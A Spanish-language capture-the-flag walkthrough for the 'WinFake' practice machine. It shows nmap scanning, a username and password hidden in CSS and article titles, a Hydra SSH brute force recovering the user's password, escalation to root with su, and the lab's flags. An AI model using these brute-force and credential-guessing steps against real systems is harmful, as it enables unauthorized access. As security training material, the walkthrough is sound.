---
icon: flag
---

# CTF WinFake Easy

URL Download CTF = [https://drive.google.com/file/d/1n6p83ULWIgTmy02D3NgPQcC8IzwBoNPs/view?usp=sharing](https://drive.google.com/file/d/1n6p83ULWIgTmy02D3NgPQcC8IzwBoNPs/view?usp=sharing)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip winfake.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_run.sh winfake.tar
```

Info:

```
██████╗ ██╗    ██╗███╗   ██╗██████╗ ██████╗ ██╗
██╔══██╗██║    ██║████╗  ██║╚════██╗██╔══██╗██║
██████╔╝██║ █╗ ██║██╔██╗ ██║ █████╔╝██║  ██║██║
██╔═══╝ ██║███╗██║██║╚██╗██║ ╚═══██╗██║  ██║╚═╝
██║     ╚███╔███╔╝██║ ╚████║██████╔╝██████╔╝██╗
╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚═════╝ ╚═════╝ ╚═╝

          ==                           
         @+:@ @##@                     
          @++:-----+@ @@#+:----:+#     
           #-+-----:+:---------:       
            *::-----++-----::::#       
             ::------+:--------:       
             #-+------+:-::-----#@     
              *::+=@@#++-------::@     
              @+=     @++::+#@@@#*#    
               #-@                     
                *+#++@                 
               +-:::+-@                
               :-:+:::+                
              @+::*::::                
             *::++-::*                 
          =:--:-:++ @-#                
      #*:---:--++@   @@                
      @::-:--++*                       
       @::-:++#                        
         *++*                          

 :: Plataforma de máquinas vulnerables ::
 :: Desarrollado por Pwn3d! y Dockerlabs - creado por @d1se0 ::

 █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
 █           FLAG{Pwn3d!_is_awesome!}            █
 █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█


[✔] bc ya está instalado.

[✔] Docker ya está instalado
[!] Limpiando previos contenedores e imágenes
[✔] Cargando la máquina virtual      
[✔] Activando máquina virtual      

[✔] Máquina activa. Dirección IP: 172.17.0.2
[!] Presiona Ctrl+C para limpiar y salir
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-10 11:21 EDT
Nmap scan report for 172.17.0.3
Host is up (0.000086s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ac:49:60:90:20:5a:92:7d:7b:4d:13:98:0d:ae:52:6b (ECDSA)
|_  256 68💿ce:ec:58:42:e5:c7:52:46:ca:1f:b6:26:a4:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: TechWorld Noticias
MAC Address: 02:42:AC:11:00:03 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.49 seconds
```

Veremos que tenemos un puerto `80` abierto, en el que tiene alojado una pagina web, si entramos dentro veremos una pagina web como de una especie de noticias a nivel de actualidad, pero no veremos nada interesante, vamos inspeccionar el codigo por dentro a ver que encontramos.

Si inspeccionamos el codigo veremos en el `CSS` el siguiente parametro bastante interesante y raro, ya que no existe en `top` la palabra `pipe` por lo que podremos ceer que pude ser un usuario del sistema.

```css
body {
            font-family: "Segoe UI", Arial, sans-serif;
            background: #f4f4f9;
            margin: 0;
            padding: 0;
            color: #333;
		    top: pipe; /* <-------- EN ESTA PARTE */
        }
```

Tambien vemos la siguiente linea que esta oculta con un `hidden` y dentro el texto llamado `acrostico inicial`.

```html
<article hidden="acrostico inicial">
	    <h2>HIDDEN</h2>
	</article>
```

Si investigamos sobre ello veremos lo siguiente en `Google`:

```
poema o texto donde las letras iniciales de cada verso, leídas verticalmente, forman una palabra o frase
```

Por lo que vemos todas las iniciales de donde estan las noticias pueden formar una frase, si cogemos las iniciales de cada titulo de un articulo formaran la siguiente palabra.

```
winserverrootfakenews
```

Por lo que si la probamos con el usuario `pipe` por `SSH` no va a funcionar, vamos a creer que es de `root`, por lo que tendremos que acceder al servidor con dicho usuario.

Vamos a realizar un ataque de `Fuerza bruta` con dicho usuario por `SSH`.

## Escalate user pipe

### Hydra

```shell
hydra -l pipe -P <WORDLIST> ssh://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-10 11:41:29
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://172.17.0.3:22/
[22][ssh] host: 172.17.0.3   login: pipe   password: kisses
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 23 final worker threads did not complete until end.
[ERROR] 23 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-10 11:41:46
```

Veremos que ha funcionado y obtendremos la contraseña del usuario `pipe` por lo que vamos a conectarnos por `SSH`.

### SSH

```shell
ssh pipe@<IP>
```

Metemos como contraseña `kisses` y veremos que estaremos dentro.

Info:

```
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.12.13-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Thu Jul 10 17:15:11 2025 from 172.17.0.1
Windows PowerShell
Copyright (C) Microsoft Corporation. Todos los derechos reservados.

Intente el nuevo Windows Terminal: https://aka.ms/terminal

PS C:\Users\pipe> whoami
DESKTOP-BXA2HDX\pipe
```

Ahora leeremos la `flag` del usuario.

> user.txt

```powershell
type /home/pipe/user.txt
```

Info:

```
d970977b69a543ce746095e2b660d107
```

## Escalate Privileges

Vemos algo interesante y es que esta simulando una `shell` de `Windows` con los comandos propios del propio sistema, tendremos muchas limitaciones entorno a los comandos, pero vamos a probar la palabra anterior con el usuario de `root`.

```shell
su root
```

Metemos como contraseña `winserverrootfakenews`, pero no sirve, por lo que vamos a intentar poner las principales palabras en mayusculas de esta forma.

```
WinServerRootFakeNews
```

Ahora si probamos esta palabra otra vez con el usuario `root`.

```shell
su root
```

Metemos como contraseña `WinServerRootFakeNews`...

Info:

```
root@984e5b697abb:/home/pipe# whoami
root
```

Veremos que seremos el usuario `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
fa209fcfb40c4276bd2ceb9f08bf5f7b
```
